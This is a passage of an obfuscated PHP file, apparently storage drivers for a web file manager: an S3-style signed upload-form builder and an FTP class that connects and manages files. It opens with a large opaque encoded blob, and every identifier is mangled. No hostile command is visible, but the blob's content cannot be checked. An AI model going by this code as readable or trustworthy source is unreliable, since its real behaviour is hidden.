b\xfc\xed\x3\x9a\x36\x30\x5e\x45\x2e\xe6\xcc\x7b\xeb\xac\xcd\x2c\x70\x31\x83\xc2\xc3\xca\xdf\xad\x95\xaf\xda\xf0\x90\xaa\xb2\xfc\x8\xaf\xe8\x36\xdb\x86\x3e\x55\x40\x44\x27\xb2"."\225\141\25\331\327\161\5\15\234\54\111\61\134\73\273\345\104\207\156\160\225\343\301\311\12\175\23\136\301\17\337\37\353\234\237\362\2\360\156\236\211\270\113\354\216\134\56\204\353\352\162\221\250"."\x25\x9c\x4a\xe2\x18\x6f\x2b\x65\xed\x98\xfa\xac\x32\xc5\x37\x3\x54\x7b\xa7\xb0\x17\x73\x28\x8d\x16\xfa\x15\x7e\x87\xc0\xdf\x87\x50\xa\xf3\x5a\x6c\xe3\x47\x7d\xed\x45\xe7\x23\xb1\xed\xc0\x2c\x75\x53\xb2\xcd\x3e"."\204\373\1\241\24\233\64\305\271\15\113\233\212\42\127\204\266\347\104\6\13\206\172\25\322\366\5\344\225\225\12\271\330\163\11\373\32\367\327\136\222\44\131\260\65\40\170\323\346\347\153\374\251"."\100\112\332\163\43\62\203\234\240\105\274\213\104\263\35\332\5\322\273\21\34\24\65\211\165\104\143\355\44\372\252\344\175\16\351\310\357\212\272\265\173\161\11\211\45\102\121\151\273\46\314\202\315".strrev('Zzc·”òSáLY¤õõÀ¹J[‰×•¨>Ğ¬¦R\\Z S8,âºß¡AA%ŠĞ‡:ö{ö')."\22\105\6\266\134\204\147\177\271\12\354\146\116\242\113\170\231\6\222\166\111\166\132\47\75\376\201\142\222\372\226\304\311\172\353\25\316\2\253\264\146\32\231\56\145\20\370\112\334\260\113\324\53"."\x99\xe1\x11\x49\x58\xbc\xd4\xc7\xef\xa5\x5d\x7c\x29\xb3\xec\x53\x64\xb6\x8f\x99\xea\xe1\xa\x88\xdb\x2e\xdc\x3\x4b\xce\x43\xd5\x62\xa7\xfb\xa2\x67\x72\x11\xf2\xcd\xb2\x22\x34\xf\x73\x5e\xc2\xa6\x4f\xce\xb1\xf0"."\63\57\135\154\26\53\345\124\370\24\311\222\106\64\311\131\161\30\35\61\110\220\61\252\63\165\162\157\375\14\357\114\70\2\311\166\176\354\164\7\33\15\132\130\22\32\340\363\61\243\163\240\214"."\15\160\2\306\224\156\370\211\167\53\341\254\207\270\364\342\363\111\174\177\361\130\121\142\66\164\256\250\115\134\137\311\164\137\50\57\121\375\155\14\320\125\51\237\216\20\316\156\166\150\334\273\0"."\xd0\xfa\x70\xe6\xc3\x3b\x2e\xa2\x31\xd4\xfb\x96\xe9\xd0\x80\x74\x55\x2\xef\xd\xc9\x2f\xd5\x90\x52\xa2\x1f\xc2\x2c\x1\x25\x99\xf4\xb5\x18\x69\x60\x84\x12\x16\x75\xa\xc6\xec\x2e\x38\x91\x13\xc9\x9\x93\x27\x96"."\53\162\141\254\204\52\251\103\4\70\62\327\324\142\207\10\16\161\145\373\50\67\133\307\112\222\170\27\347\172\366\226\34\141\271\34\71\55\107\204\152\235\72\112\363\44\16\65\254\63\337\6\354".strrev('<KUl²UsQ+e|i(—Çi0pÖÑ"T‘œáÂ§ˆú—šdp‹IRy|MIçéÖÙß¨')."\x9d\x44\x57\xd\x11\x4f\xd3\x19\x60\xe8\xdd\xc7\x5f\x20\xc2\x41\x6f\x1f\x3a\x5b\x78\x53\xfc\x4c\x66\x89\xd3\x17\xe9\x14\x54\x26\x5e\x80\x74\x56\x4b\x11\x51\x2f\x96\xd5\x98\xc7\xb6\x88\xd9\xb2\x32\x58\xe8\x5e\x1"."\x3a\x2b\x64\xc6\x12\x70\xa1\xa8\x97\xc3\x8f\xea\x58\x17\x52\x6a\xb1\x54\xa0\x54\xa1\x35\x0\x5f\xf9\xb\xe4\xf9\x28\x19\x1a\xb1\x4c\x7a\x7e\xb2\xc6\x1b\xf9\x21\xc3\x32\x4\x5\x60\x25\x46\xe5\xda\x3\xcd\xed\xe1".base64_decode('DjUQiUSXOZSVxXVDkQtfUvLrX9LMiEmgX5e9bsopjudRXAIZOn2yS9gCuxmDd4v5kz40Kr0=')."\316\127\50\152\206\245\113\11\364\41\271\172\60\357\323\262\131\307\33\274\331\176\51\132\162\156\261\25\77\245\322\17\260\64\302\374\116\16\20\13\267\266\45\376\307\115\65\122\302\121\242\221\142".strrev('·È-Rã\'ÄÒ¥Tp´ÓçÀRIª¼ö8¯ˆ×>Hô7_Oü§•Joßfn_”ö¾›”ÜhZ')."\xba\xfe\x14\xd4\x80\x5d\xd9\x86\x98\xb5\x12\x8e\x88\xb3\xc\x86\x82\x4a\xf0\x57\xe8\x9\x17\x1d\xdc\xb1\x10\x92\x9d\x7a\x98\x40\xf\x51\xe\x18\x70\x87\xe6\xa5\xeb\x79\x46\xb7\xce\xbe\xe3\xf1\xc5\xb2\x6f\x90\x7".base64_decode('fWheN+4FguwVfUIxruEuirpzKjQAZStCNMYBlEaljj4kyh9nUhYyhxXiA8RpYyhXsB2n/zY=').base64_decode('2X5HmhKagOVERS70o3POonhi2f2zqcrbJSG94kyIlTLN3GhZgkOKFmG94erR+EGrfL8pjzo=').base64_decode('Ue/HJlz0fWAqnPCg44hul78oSIv/3xSkmXHJL7GzkvIGWe4tk293DksE8nJixhx2viCMUyQ=')."\xce\x8d\x59\x3f\x48\xe5\xa5\xf5\x46\x9c\x31\xc8\xf\x3b\x3a\xc\x20\x1c\x8f\x76\xd1\xc\x85\xbc\x3\xaf\x20\xd2\x4\x98\x80\xb5\x80\xd8\x51\x98\x0\x4b\xdf\x9e\x42\x7f\x7a\xe0\xd7\x9c\xa4\x11\x94\xea\xc1\x27\x6b"."\x39\x62\x6\x33\x46\x36\x55\xe4\xfa\x5d\x22\xa1\x5d\x17\xf2\x9\x52\xa\x91\x99\x82\xc6\xde\xbb\x27\xcf\xa8\x36\x33\x2\xf\x2f\x9b\x55\x7a\x41\x13\xbb\x76\x75\x3e\xd0\x26\xde\xbd\x13\x1b\xb1\xf3\x1d\x30\xae\x54"."\x60\x89\x5\x65\xd9\x8e\x97\xe7\x12\x66\x42\x4b\x7b\x28\xe2\x62\x12\x29\x62\x4d\xa3\x72\x58\x56\xe0\x27\xbd\x40\x99\x4c\x86\x28\xcc\x7f\x17\xb1\x14\xf\x79\x18\x95\x52\x46\xf7\x73\x69\xd2\xa\xe5\x4\x58\x36\x72"."\x11\x6e\x29\x21\x8f\x78\x2d\x5\x5\x44\x87\x9\x60\x11\x9d\xd3\x74\xb6\xa9\x38\xc0\x68\x92\x5f\x2b\x14\xc4\xad\x8a\xbc\x7\xa3\xff\x1d\xb6\xdf\x90\xd7\x95\x68\x53\x89\x37\x14\x95\x6a\x4a\xc4\x5\xde\x49\x37\x9d"."\x34\x11\x6e\x3d\x4b\xf9\x30\xbd\xdd\x71\xa4\x16\xa5\x13\xa4\xec\xe3\x9b\xde\xf8\x8\x23\x61\x0\x47\xed\xec\xa4\x57\xbc\x30\x80\x72\x95\xec\xda\x9d\x4b\xe8\x11\x85\xe2\x7\x6d\x7f\xf9\x35\x3d\xd6\x5d\x3\x1a\x83"."\165\205\230\222\326\200\111\16\152\76\371\210\7\0\312\102\346\307\6\61\236\136\201\51\216\125\216\61\13\261\334\364\125\132\102\106\144\162\127\71\225\60\343\204\362\172\201\160\260\71\246\373\40"."\366\31\301\174\343\146\371\221\214\77\216\53\105\371\252\160\76\365\107\227\17\371\151\326\373\371\171\13\307\5\273\41\273\204\22\22\25\367\163\266\345\117\363\262\147\170\331\372\203\67\170\53\74"."\xac\x3b\xe9\xbb\xbc\x1e\x61\x50\xfe\x55\x2f\x8\xa\xf3\xe5\x2\x9a\x4b\xe7\x23\xcb\x9c\x59\xe1\x47\x9a\xb2\x53\x91\xfb\x40\xc4\x27\xc3\x55\x20\xe6\x9e\xb0\x84\x59\x2e\xdb\x16\x9a\x10\x8e\x57\x83\xa5\x5e\x3\x7d".strrev('08f'."\r".'ÜöìŠû'."\r".'$å0yÈ,Ì­¯ãùáZİ÷Åãâ³L<B”CÖb¥ß©Xy,').base64_decode('7enCppG61i7bZVbkUjNmzp4vy13EFIo7ZXAsA1fjwDYJpFCcaKgwf94y+SCZTrud8peyXds=')."\xc8\xff\x6c\xc1\x88\xf3\xc\x5\x95\x74\x85\x79\x7d\x95\x1e\xc7\x94\xf0\x54\x52\x62\x73\xe9\x1c\x99\x58\xd\xc8\x92\x96\x9a\xb3\x46\xca\x77\x54\x68\xad\xb4\x45\x8a\x25\x41\x5f\x36\x36\xb3\xf8\x90\x9f\xc3\xb7\xb".base64_decode('dlFzHmQrnddIf9nhEAuIRcyptQXiHJEtHejkGm3TLYvCxfEWSuSq0XwWdnjscUOsqQqD8BU=')."\xd3\xc4\xce\x66\xf4\x18\x27\xd4\xd5\x70\xf7\x1d\x62\x3a\xe7\x28\xf8\x4f\x60\xc4\xa4\xc2\xeb\xd5\x92\x76\xce\x57\xf4\x81\xb2\x88\xfc\x4c\xea\xd5\x6c\xaf\x84\x82\x92\x2c\x53\xb7\xa3\x64\x76\x81\x28\x88\xa3\xb3\xb3"."\337\256\352\121\61\121\107\257\107\231\14\250\314\312\125\176\344\132\370\172\224\170\102\134\232\131\304\117\42\171\40\6\331\116\356\112\176\110\227\130\63\13\127\105\144\201\72\26\253\344\6\137\266"."\x6\x26\x15\xc9\xab\xa0\xbc\x6a\xe9\x59\x62\x21\xa2\x22\x32\x2d\xe8\x11\x2c\x61\xa2\xae\x41\x9a\x19\x68\xe5\xb6\xe4\x9a\xa4\x7b\xe8\x94\x9b\x31\xc7\x27\x7c\x91\xe0\xb1\x97\x5e\xac\x37\xe5\xb0\xf4\xdc\x35\xa2\xfc"."\121\146\250\201\232\343\70\377\242\270\160\374\56\121\251\224\53\221\215\31\41\15\342\155\166\302\44\117\3\366\130\366\130\340\70\161\361\167\133\35\47\60\313\375\170\63\342\47\35\17\323\244\304"."\236\14\173\64\20\113\142\227\107\277\46\155\267\142\147\25\241\216\122\116\104\44\131\64\71\266\361\114\207\143\7\354\337\320\105\61\230\273\10\313\365\34\74\165\343\116\303\354\74\361\277\176\267".base64_decode('+P/Vc8Wz69itAbfqwx/iZoStwN5Ds/ElLpedUNG1q0POvfVAQC40C74hQWtInGuxM2eXzAc=').base64_decode('psbu+LRsVtqBKx+Iyh6mRzg5wF8irxRxmx+7H6nvJpJj9sp8ryAvOK1SMflpa9ez9qQulCI=')."\325\302\25\35\1\330\313\267\156\113\152\130\5\131\4\343\331\5\315\313\33\311\201\12\67\375\104\345\327\371\220\203\304\342\224\201\211\346\43\116\210\153\35\263\120\22\237\134\211\133\35\230\6"."\xd9\xf5\x41\xb4\xc0\xce\xb8\xb5\xb0\xcb\xf4\x9e\xc0\xa8\x21\x71\xb7\x2\x44\x51\x26\x84\x8e\xa4\x32\xf2\x99\x70\x4c\xae\x23\x51\x9e\x37\x41\xe3\x7c\x4e\x3f\x4f\x50\xa2\xdd\xf5\xf2\x36\x5\xb2\xe4\xb1\x75\xdc\x5d"."\224\53\176\224\227\346\224\105\56\202\255\20\234\62\73\74\255\344\160\123\347\165\45\324\173\135\325\361\307\307\235\213\306\361\32\66\125\226\101\53\55\206\145\63\114\106\107\256\277\310\105\271\267".base64_decode('vAxdIHEBM8kSrUwxeKOEnBKH5PFglKezaBJ205nK5VWS8ndSEga7OUiaPMVXtisyIuyYKaw=')."\175\50\256\135\23\321\130\110\135\26\306\156\72\302\47\207\272\230\23\152\303\44\157\310\260\52\273\332\153\210\11\36\54\0\164\26\152\61\5\52\351\210\74\112\222\151\341\111\331\316\25\202\374"."\222\330\151\247\55\331\175\60\227\145\262\254\324\11\214\155\166\234\153\161\121\45\260\244\131\264\144\67\244\216\114\314\326\231\50\67\306\216\363\375\114\315\243\53\217\126\264\236\264\365\224\202\71".strrev('$‰7ÎE÷"­âMÛq¤„<¥P¹Ô™Ë0fXÓ/Lø•g	_YÈsåª¯ŞÌİV{¡Ç').strrev(' ÄXOÊeNj÷²ˆ\'â¡l3‡±ú'."\0".'k{8•ùv<˜0ò¸ÃÁA˜u$ÙY˜ñÉî}.!')."\44\115\204\364\226\37\61\341\113\166\161\64\132\214\345\72\312\374\2\72\215\315\244\362\104\376\104\105\112\16\311\22\50\71\310\111\322\245\77\72\335\245\234\357\326\221\114\222\314\34\243\103\15"."\322\265\265\123\153\200\333\361\226\355\271\45\43\42\145\223\122\314\301\56\372\305\36\7\302\302\3\25\311\246\367\160\201\41\215\73\171\163\227\352\162\234\234\45\35\203\44\41\46\241\362\153\144"."\161\273\55\61\262\254\30\76\172\13\146\302\225\56\21\137\261\75\152\103\202\55\27\307\302\124\252\205\75\110\353\0\115\351\156\47\175\50\205\203\22\266\136\162\25\42\354\211\364\141\371\353\0".base64_decode('J+x3HIDlqcKViFRe3COKbuK0St0nxNBZXHZVwpFKJNHXu7hCjnQEx9pLQlOHdoXLk8QnnY4=')."\121\70\30\237\63\4\103\54\13\275\216\124\227\24\1\213\356\30\357\351\312\2\141\226\124\175\105\231\227\204\2\172\66\42\125\47\253\25\114\132\40\136\371\43\2\53\235\103\54\171\224\21\31"."\214\273\61\35\203\57\155\157\274\143\0\31\223\63\35\315\251\200\32\354\70\342\320\41\51\313\64\263\131\174\121\74\111\66\125\71\226\66\343\162\10\41\251\245\15\42\247\157\261\160\150\142\216".strrev('Hö²’¢(»,ÙkwÜ¨'."\r".'Óe‹ÓË3Ê'."\n".'‰#2v§)–<p–”Ç¸“q®ëÂ‹3€¼Ğ{\\')."\332\122\11\263\102\31\332\242\212\305\150\26\56\51\216\142\216\262\223\14\1\56\113\263\160\331\262\154\126\270\154\134\111\71\133\53\131\223\164\257\174\360\100\40\227\252\320\141\41\266\222\100\47"."\33\317\212\300\345\237\203\65\340\206\46\22\274\312\255\20\202\67\227\262\112\245\126\124\4\236\264\25\156\150\301\17\341\203\167\245\234\212\13\24\74\346\127\330\61\130\116\205\75\202\322\277\111"."\265\277\204\106\124\371\146\45\362\52\350\147\321\117\142\316\114\366\303\131\41\133\126\366\252\254\16\26\253\110\337\54\247\236\226\53\135\36\40\360\61\117\43\114\237\23\261\207\131\143\100\350\301"."\62\333\231\51\216\115\254\224\37\310\233\174\143\114\11\75\150\314\325\5\212\356\161\56\253\315\211\372\371\222\344\327\277\242\51\217\7\113\307\312\45\117\131\215\333\127\12\125\101\172\260\67\155"."\43\251\73\37\17\220\275\1\322\174\366\221\254\44\161\167\211\301\205\254\316\241\76\124\101\70\114\222\150\320\47\356\235\150\175\22\133\46\160\302\141\165\107\231\41\270\344\243\312\3\101\174\223"."\307\57\212\211\137\173\312\74\320\354\270\131\264\75\70\57\141\26\310\157\223\151\333\102\27\207\212\303\310\21\0\163\0\36\111\325\14\205\304\15\61\156\24\271\137\44\150\113\50\26\11\202\32"."\3\26\57\305\165\232\113\350\234\43\202\357\55\171\104\336\340\341\126\262\245\344\122\270\20\11\3\146\252\317\34\141\76\60\21\136\111\203\44\356\50\65\67\127\73\344\266\374\226\25\347\210\163"."\27\313\117\163\374\360\122\225\227\324\1\157\372\372\126\25\322\216\342\364\361\121\256\12\377\125\65\300\15\206\250\202\76\123\103\304\311\140\25\30\117\304\313\262\72\3\361\370\262\150\254\231\276"."\x6a\x53\x96\x4d\x4a\x49\x1a\x89\x65\x59\x9d\x6d\xd1\x8e\xc9\xf2\x42\xed\x81\x70\xa4\x2c\xf\x2b\x2f\x76\xa8\xc2\x9b\x2a\xcd\xa\x77\x92\x56\x92\x7b\xfa\xc9\x5a\x11\xe\x2e\x11\x2d\x61\x97\x80\x11\x78\x3b\x55\xcc"."\202\164\51\126\310\230\354\256\213\301\307\65\366\144\271\174\235\242\347\204\163\135\121\306\51\166\223\147\333\142\136\260\171\300\371\160\244\113\163\330\251\340\302\220\32\252\305\72\211\35\360\245\130"."\1\122\361\113\100\234\66\360\323\205\120\205\361\71\264\154\244\164\262\176\10\101\222\360\122\336\353\311\245\51\227\306\221\354\151\25\7\117\276\172\51\277\374\43\271\142\160\160\63\117\64\101\317"."\165\225\331\47\16\164\160\322\3\373\176\30\156\111\13\225\206\35\331\266\226\146\302\122\207\116\11\225\241\143\172\41\244\333\377\7\221\23\123\52\145\274\0\0".""."".""."", 10, -8))); goto a×Ô¬†ä÷¦; bé¼­Ë²Æ¤: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($†¿ô¶œÍ) { parent::__construct($†¿ô¶œÍ); $this->setSignVersion($_SERVER[ıÚ˜š²İ][250]); } public function uploadFormData($ÖñßîÔ, $”æ•ìĞ² = 3600) { $ÎÏ°ƒ­ì =& $_SERVER[ıÚ˜š²İ]; $¨½ıÙ’ = $ÎÏ°ƒ­ì[232]; $µÀÒÃ = $ÎÏ°ƒ­ì[260]; $Äâ¹‹Ä = $ÎÏ°ƒ­ì[62]; $“¥óëáè = gmdate($ÎÏ°ƒ­ì[261]); $’Üıçí‡ = gmdate($ÎÏ°ƒ­ì[262]); $Ì—Â‚ñü = $ÎÏ°ƒ­ì[263]; $¦’ÎÓ¢È = $”æ•ìĞ² . $ÎÏ°ƒ­ì[12]; $ãÒÏÅâ = $ÎÏ°ƒ­ì[264]; $İêóéü® = array($this->accessKey, $’Üıçí‡, $this->region, $Äâ¹‹Ä, $Ì—Â‚ñü); $²Ô¬ğÊ = implode($ÎÏ°ƒ­ì[8], $İêóéü®); $‘å•»¢ = array($ÎÏ°ƒ­ì[265] => gmdate($ÎÏ°ƒ­ì[1434], strtotime($ÎÏ°ƒ­ì[267])), $ÎÏ°ƒ­ì[268] => array(array($ÎÏ°ƒ­ì[269] => $this->bucket), array($ÎÏ°ƒ­ì[309] => $¨½ıÙ’), array($ÎÏ°ƒ­ì[270], $ÎÏ°ƒ­ì[271], $ÎÏ°ƒ­ì[12]), array($ÎÏ°ƒ­ì[270], $ÎÏ°ƒ­ì[272], $ÎÏ°ƒ­ì[12]), array($ÎÏ°ƒ­ì[270], $ÎÏ°ƒ­ì[310], $ÎÏ°ƒ­ì[12]), array($ÎÏ°ƒ­ì[273] => $ãÒÏÅâ), array($ÎÏ°ƒ­ì[274] => $²Ô¬ğÊ), array($ÎÏ°ƒ­ì[275] => $µÀÒÃ), array($ÎÏ°ƒ­ì[276] => $“¥óëáè), array($ÎÏ°ƒ­ì[277] => $¦’ÎÓ¢È))); $›ÈÁ‚¸ = base64_encode(json_encode($‘å•»¢)); $ÉŠ×çÁå = hash_hmac($ÎÏ°ƒ­ì[278], $’Üıçí‡, $ÎÏ°ƒ­ì[279] . $this->secret, !0); $ãê«Íä– = hash_hmac($ÎÏ°ƒ­ì[278], $this->region, $ÉŠ×çÁå, !0); $›€¡Ä´ã = hash_hmac($ÎÏ°ƒ­ì[278], $Äâ¹‹Ä, $ãê«Íä–, !0); $ìî¸¼Ñ° = hash_hmac($ÎÏ°ƒ­ì[278], $Ì—Â‚ñü, $›€¡Ä´ã, !0); $§İöØ–İ = hash_hmac($ÎÏ°ƒ­ì[278], $›ÈÁ‚¸, $ìî¸¼Ñ°); $©‡Û¬Æô = array($ÎÏ°ƒ­ì[249] => $ÎÏ°ƒ­ì[12], $ÎÏ°ƒ­ì[297] => $ÎÏ°ƒ­ì[12], $ÎÏ°ƒ­ì[309] => $¨½ıÙ’, $ÎÏ°ƒ­ì[273] => $ãÒÏÅâ, $ÎÏ°ƒ­ì[280] => $›ÈÁ‚¸, $ÎÏ°ƒ­ì[311] => $²Ô¬ğÊ, $ÎÏ°ƒ­ì[312] => $µÀÒÃ, $ÎÏ°ƒ­ì[313] => $“¥óëáè, $ÎÏ°ƒ­ì[314] => $¦’ÎÓ¢È, $ÎÏ°ƒ­ì[315] => $§İöØ–İ, $ÎÏ°ƒ­ì[209] => $this->getHost()); return $©‡Û¬Æô; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($¼‰é´ï×) { parent::__construct(); if (count($¼‰é´ï×) > 0) { $this->_init($¼‰é´ï×); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($æõ‘Ñ’µ) { $£óœ ş =& $_SERVER[ıÚ˜š²İ]; global $config; $this->appCharset = $config[$£óœ ş[1460]]; $this->systemCharset = $config[$£óœ ş[1461]]; if (isset($æõ‘Ñ’µ[$£óœ ş[1462]]) && $æõ‘Ñ’µ[$£óœ ş[1462]]) { $this->systemCharset = $æõ‘Ñ’µ[$£óœ ş[1462]]; } } public function iconvApp($’Šğ»µ) { return $this->iconvTo($’Šğ»µ, $this->systemCharset, $this->appCharset); } public function iconvSystem($µş‰Şâ) { return $this->iconvTo($µş‰Şâ, $this->appCharset, $this->systemCharset); } public function getPathOuter($½ÚØÛ¾˜) { $œ´Ì¡‰ =& $_SERVER[ıÚ˜š²İ]; $©úíÚª = $this->iconvApp($this->pathBase); $½ÚØÛ¾˜ = $this->iconvApp($½ÚØÛ¾˜); if (substr($©úíÚª, 0, 2) == $œ´Ì¡‰[1432]) { $©úíÚª = BASIC_PATH . substr($©úíÚª, 2); } if (substr($½ÚØÛ¾˜, 0, 2) == $œ´Ì¡‰[1432]) { $½ÚØÛ¾˜ = BASIC_PATH . substr($½ÚØÛ¾˜, 2); } $©úíÚª = KodIO::clear($©úíÚª); $½ÚØÛ¾˜ = KodIO::clear($½ÚØÛ¾˜); $½ÚØÛ¾˜ = substr($½ÚØÛ¾˜, strlen($©úíÚª)); if (empty($this->pathDriver)) { return $½ÚØÛ¾˜; } return $this->pathDriver . $œ´Ì¡‰[8] . ltrim($½ÚØÛ¾˜, $œ´Ì¡‰[8]); } private function _init($ı¼£ö¥Â = array()) { $‹¬Ùìß =& $_SERVER[ıÚ˜š²İ]; if (!function_exists($‹¬Ùìß[1463])) { throw new Exception(LNG($‹¬Ùìß[1464])); } $this->config = $ı¼£ö¥Â; $this->charsetReset($ı¼£ö¥Â); foreach ($ı¼£ö¥Â as $„İß¨øÁ => $Ù¹·Åˆó) { if (isset($this->{$„İß¨øÁ})) { $this->{$„İß¨øÁ} = $Ù¹·Åˆó; } } return $this->_login($ı¼£ö¥Â); } private function _login($œ¡‹†“ã) { $‹£ºÓĞº =& $_SERVER[ıÚ˜š²İ]; static $ÔâêÙÏ = array(); $ŒïÊ¿™´ = md5(json_encode($œ¡‹†“ã)); if (isset($ÔâêÙÏ[$ŒïÊ¿™´])) { foreach ($ÔâêÙÏ[$ŒïÊ¿™´] as $Öş”‰æ¿ => $Ï‘îÁĞ¹) { $this->{$Öş”‰æ¿} = $Ï‘îÁĞ¹; } return !0; } $ñ™©Ï¥  = parse_url(trim($this->server, $‹£ºÓĞº[8])); $this->host = $ñ™©Ï¥ [$‹£ºÓĞº[209]]; $è®í´îË = isset($ñ™©Ï¥ [$‹£ºÓĞº[208]]) && $ñ™©Ï¥ [$‹£ºÓĞº[208]] == $‹£ºÓĞº[1465] ? !0 : !1; $this->scheme = $è®í´îË ? $‹£ºÓĞº[1466] : $‹£ºÓĞº[1467]; $this->port = isset($ñ™©Ï¥ [$‹£ºÓĞº[210]]) ? $ñ™©Ï¥ [$‹£ºÓĞº[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($‹£ºÓĞº[1468]) . $this->host . $‹£ºÓĞº[4] . $this->port, !0); return !1; } $àôû©÷ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$àôû©÷) { $this->writeLog(LNG($‹£ºÓĞº[1469]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $‹£ºÓĞº[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $¹ƒÁ«”» = $this->pasv == $‹£ºÓĞº[91] ? !0 : !1; @ftp_pasv($this->connect, $¹ƒÁ«”»); $ÔâêÙÏ[$ŒïÊ¿™´] = array($‹£ºÓĞº[1470] => $this->connect, $‹£ºÓĞº[209] => $this->host, $‹£ºÓĞº[208] => $this->scheme, $‹£ºÓĞº[210] => $this->port); return $àôû©÷; } private function _isconn($Ğò¥ª“§ = true) { if (is_resource($this->connect)) { return !0; } if (!$Ğò¥ª“§) { return !1; } return $this->_login($this->config); } public function mkfile($‘İÚ€›Ï, $Ë¢áİĞø = '', $ºŒÉ²Âš = REPEAT_RENAME) { if ($this->setContent($‘İÚ€›Ï, $Ë¢áİĞø)) { return $this->getPathOuter($‘İÚ€›Ï); } $this->writeLog(LNG($_SERVER[ıÚ˜š²İ][1471]), !0); return !1; } public function mkdir($èÄñÚ´Ğ, $ƒŞ•Ñ±ù = REPEAT_SKIP) { $×¾é˜çò =& $_SERVER[ıÚ˜š²İ]; if (!$èÄñÚ´Ğ || $èÄñÚ´Ğ == $×¾é˜çò[8]) { return !0; } if (!$this->_isconn()) { return !1; } $èÄñÚ´Ğ = $this->iconvSystem($èÄñÚ´Ğ); if ($this->_isFolder($èÄñÚ´Ğ) || @ftp_mkdir($this->connect, $èÄñÚ´Ğ)) { return $this->getPathOuter($èÄñÚ´Ğ); } if (!$this->mkdir($this->pathFather($èÄñÚ´Ğ))) { return !1; } if ($èÄñÚ´Ğ = @ftp_mkdir($this->connect, $èÄñÚ´Ğ)) { return $this->getPathOuter($èÄñÚ´Ğ); } $öÊÓ–•™ = __FUNCTION__ . $×¾é˜çò[1472]; $this->writeLog($öÊÓ–•™, !0); return !1; } public function copyFile($“Ï‡®ß, $«¢²•àÜ) { if (!$this->_isconn()) { return !1; } $Å¢é©ğ = $this->pathThis($this->iconvSystem($“Ï‡®ß)); $ê—´¼¼Ú = $this->tempFile($Å¢é©ğ); $€¬½² Ü = $this->iconvApp($ê—´¼¼Ú); $this->download($“Ï‡®ß, $€¬½² Ü); $û²ÚŞšÂ = $this->upload($«¢²•àÜ, $€¬½² Ü); $this->tempFileRemve($ê—´¼¼Ú); return $û²ÚŞšÂ; } public function moveFile($ÜÏÑæ, $•Îşìğ¾) { if (!$this->_isconn()) { return !1; } $ÜÏÑæ = $this->iconvSystem($ÜÏÑæ); $•Îşìğ¾ = $this->iconvSystem($•Îşìğ¾); $û£êø¤  = @ftp_rename($this->connect, $ÜÏÑæ, $•Îşìğ¾); if (!$û£êø¤ ) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); return !1; } return $this->getPathOuter($•Îşìğ¾); } public function delFile($ŞÅÕäØè) { if (!$this->_isconn()) { return !1; } $ŞÅÕäØè = $this->iconvSystem($ŞÅÕäØè); $·²¸µí– = @ftp_delete($this->connect, $ŞÅÕäØè); if (!$·²¸µí–) { $this->writeLog(__FUNCTION__ . $_SERVER[ıÚ˜š²İ][1472], !0); } return $·²¸µí–; } public function delFolder($²…¹æÎ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Ö¶…×ï = $Ï»”»ñ³ = array(); $this->fileList($²…¹æÎ, $Ö¶…×ï, $Ï»”»ñ³, !0); $this->listItemCache = !0; foreach ($Ï»”»ñ³ as $ãç­÷îĞ) { $Ä©« àğ = $this->iconvSystem($ãç­÷îĞ[$_SERVER[ıÚ˜š²İ][32]]); $§·ÀÁ¯µ = @ftp_delete($this->connect, $Ä©« àğ); if (!$§·ÀÁ¯µ) { return !1; } } foreach ($Ö¶…×ï as $Ä©« àğ) { $Ä©« àğ = $this->iconvSystem($Ä©« àğ); $§·ÀÁ¯µ = @ftp_rmdir($this->connect, $Ä©« àğ); if (!$§·ÀÁ¯µ) { return !1; } } $²…¹æÎ = $this->iconvSystem($²…¹æÎ); return @ftp_rmdir($this->connect, $²…¹æÎ); } public function rename($ºøıû¯ë, $ùú„†—) { $¤Ğğßø’ =& $_SERVER[ıÚ˜š²İ]; if (!$this->_isconn()) { return !1; } $¾ÕŞıÅş = $this->fileNameAuto($this->pathFather($ºøıû¯ë), $ùú„†—); $¾ÕŞıÅş = $this->iconvSystem($¾ÕŞıÅş); $ºøıû¯ë = $this->iconvSystem($ºøıû¯ë); $Šğ©¢¸¹ = $this->pathFather($ºøıû¯ë); $ã•…² = rtrim($Šğ©¢¸¹, $¤Ğğßø’[8]) . $¤Ğğßø’[8] . $¾ÕŞıÅş; $Ê€’Šİğ = @ftp_rename($this->connect, $ºøıû¯ë, $ã•…²); if (!$Ê€’Šİğ) { $this->writeLog(__FUNCTION__ . $¤Ğğßø’[1472], !0); return !1; } $ã•…² = $this->iconvApp($ã•…²); return $this->getPathOuter($ã•…²); } private function folderInfo($¾âªèöŠ, $ÍÃÛÛáú = false) { $¥© œŒª =& $_SERVER[ıÚ˜š²İ]; $Ü³°°Ÿ‘ = array($¥© œŒª[32] => $this->pathThis($¾âªèöŠ), $¥© œŒª[87] => $this->getPathOuter($¥© œŒª[8] . $¾âªèöŠ), $¥© œŒª[33] => $¥© œŒª[78]); if ($ÍÃÛÛáú) { return $Ü³°°Ÿ‘; } $Ü³°°Ÿ‘[$¥© œŒª[234]] = $Ü³°°Ÿ‘[$¥© œŒª[88]] = 0; $Ü³°°Ÿ‘[$¥© œŒª[235]] = $Ü³°°Ÿ‘[$¥© œŒª[236]] = !0; return $Ü³°°Ÿ‘; } private function fileInfo($¥´ïå¤, $çÇøÃ‡Ã = false, $äÃµõ±— = array()) { $ñ”İêì™ =& $_SERVER[ıÚ˜š²İ]; $ „©ş¹† = array($ñ”İêì™[32] => $this->pathThis($¥´ïå¤), $ñ”İêì™[87] => $this->getPathOuter($ñ”İêì™[8] . $¥´ïå¤), $ñ”İêì™[33] => $ñ”İêì™[233], $ñ”İêì™[79] => isset($äÃµõ±—[$ñ”İêì™[79]]) ? $äÃµõ±—[$ñ”İêì™[79]] : 0, $ñ”İêì™[169] => $this->ext($¥´ïå¤)); if ($çÇøÃ‡Ã) { return $ „©ş¹†; } $ 